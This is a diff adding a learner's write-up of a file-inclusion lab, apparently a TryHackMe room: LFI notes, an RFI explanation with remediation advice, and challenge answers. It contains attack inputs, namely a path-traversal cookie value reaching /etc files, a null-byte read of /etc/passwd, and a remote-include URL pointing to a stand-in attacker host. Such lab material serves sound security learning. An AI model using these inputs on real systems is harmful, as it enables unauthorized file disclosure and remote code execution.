@@ -449,21 +449,65 @@ Why This Works:
 
 
 
-**LAB3** 
+**LAB3**   
 reading `/etc/passwd` using nullbyte method
 
 ![lfi](./media/5-lfi-lab3.png)
 
-**LAB6** 
+**LAB6**   
 In this case there is path first you have to enter. 
 this path gives you admin access 
 ![lfi](./media/5-lfi-lab6.png)
 
-**My Answers**  
+**My Answers**    
 Summary
 ![lfi](./media/5-lfi-2-answers.png)
 
+### REMOTE FILE INCLUSION - RFI 
 
+Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.
+
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
+- Sensitive Information Disclosure
+- Cross-site Scripting (XSS)
+- Denial of Service (DoS)
+
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.
+
+![rfi](./media/5-rfi.png)
+
+**RFI steps**
+
+The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.
+```
+<?PHP echo "Hello THM"; ?>
+```
+
+First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
+
+### REMEDIATION 
+
+As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:
+
+- Keep system and services, including web application frameworks, updated with the latest version.
+- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
+- A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
+- Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
+- Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
+- Never trust user input, and make sure to implement proper input validation against file inclusion.
+- Implement whitelisting for file names and locations as well as blacklisting.
+
+### CHALLENGE 
+
+**Flag1**
+GET Method is not working I created a script that uses post method with a parameter 
+![flag](./meia/5-challenge1.png)
+
+
+**Flag2**
+Changed the cookie value to `THM=../../../../etc/flag2`
+then refreshed 
+![flag](./meia/5-challenge2.png)
 
 
 ## My TakeAways
